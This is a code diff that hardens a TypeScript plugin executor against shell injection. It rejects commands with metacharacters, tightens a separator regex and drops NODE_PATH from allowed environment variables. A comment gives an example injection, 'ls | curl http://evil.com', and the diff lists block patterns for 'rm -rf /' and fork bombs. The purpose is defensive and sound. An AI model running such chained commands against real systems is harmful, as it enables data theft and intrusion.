@@ -143,6 +143,7 @@ export class PluginExecutorService {
   private guardian: ExecutionGuardian;
   private processKiller: ProcessKiller;
   private allowedCommands: Set<string>;
+  private evictionTimer: NodeJS.Timeout | undefined;
 
   constructor(options: {
     pluginManager: PluginManagerService;
@@ -349,13 +350,17 @@ export class PluginExecutorService {
     // 保存结果 (with timestamp for TTL eviction)
     this.executions.set(request.taskId, { result, timestamp: Date.now() });
 
-    // 发布事件
-    await this.publishEvent('plugin.task.completed', {
-      taskId: request.taskId,
-      pluginId: request.pluginId,
-      status: result.status,
-      durationMs: result.durationMs,
-    });
+    // 发布事件 (non-blocking, errors logged but don't affect result)
+    try {
+      await this.publishEvent('plugin.task.completed', {
+        taskId: request.taskId,
+        pluginId: request.pluginId,
+        status: result.status,
+        durationMs: result.durationMs,
+      });
+    } catch (err) {
+      logger.warn({ err, taskId: request.taskId }, 'Failed to publish task completion event');
+    }
 
     return result;
   }
@@ -805,7 +810,7 @@ export class PluginExecutorService {
       /\$\(/,           // command substitution
       /`[^`]*`/,        // backtick substitution
       /\{[^}]*\}/,      // brace expansion (can be used for globbing attacks)
-      /[;|&]{2,}/,      // multiple separators (allows chaining)
+      /[;|&]/,          // ANY command separator (single pipe, ampersand, or semicolon is enough for injection)
       /\brm\s+-rf\s+\/\b/,  // rm -rf /
       /\bfork\s+bomb\b/,    // explicit fork bomb mention
     ];
@@ -837,8 +842,15 @@ export class PluginExecutorService {
       return { cmd: parts[0], args: parts.slice(1), shellMode: false };
     }
 
-    // Contains shell metacharacters - use shell but with timeout limit
-    return { cmd: '/bin/sh', args: ['-c', trimmed], shellMode: false };
+    // SECURITY: Commands with shell metacharacters are rejected entirely.
+    // The allowlist only validates the first token (parts[0]), but chained
+    // commands like "ls | curl http://evil.com" would pass because "ls" is
+    // allowed while the injection executes after the pipe.  We cannot safely
+    // sanitize arbitrary shell syntax, so we reject it outright.
+    throw new Error(
+      `Command contains shell metacharacters which are not allowed. ` +
+      `Use a simple command with arguments only (no ;|&$<>()!#).`
+    );
   }
 
   /**
@@ -854,9 +866,10 @@ export class PluginExecutorService {
       LANG: 'en_US.UTF-8',
     };
 
-    // Only add explicitly allowed env vars from request
+    // Only allow explicitly permitted env vars from request
+    // SECURITY: Do NOT allow NODE_PATH (enables module path injection),
+    // LD_PRELOAD, LD_LIBRARY_PATH, or any dynamic loader variables.
     const allowedEnvVars = new Set<string>([
-      'NODE_PATH',
       'TMPDIR',
       'SSL_CERT_FILE',
     ]);
@@ -999,7 +1012,7 @@ export class PluginExecutorService {
     }, INTERVAL_MS).unref(); // unref so it doesn't keep the process alive
 
     // Store timer reference for cleanup on shutdown
-    (this as any)._evictionTimer = timer;
+    this.evictionTimer = timer;
   }
 
   /**
@@ -1018,19 +1031,21 @@ export class PluginExecutorService {
   /**
    * 关闭执行器
    */
-  shutdown(): void {
+  async shutdown(): Promise<void> {
     // Clear eviction timer
-    const timer = (this as any)._evictionTimer;
-    if (timer) clearInterval(timer);
+    if (this.evictionTimer) clearInterval(this.evictionTimer);
 
-    // Cancel all executions
-    this.sandbox?.cancelAllExecutions('Executor shutdown');
+    // Cancel all executions and wait for them to complete
+    await this.sandbox?.cancelAllExecutions('Executor shutdown');
 
-    // Shutdown sandbox
-    this.sandbox?.shutdown();
+    // Shutdown sandbox (async)
+    await this.sandbox?.shutdown();
 
     // Shutdown audit logger
     this.auditLogger?.shutdown();
+
+    // Stop guardian
+    await this.guardian.stop();
 
     // Release resources
     this.resourceManager?.releaseAll();
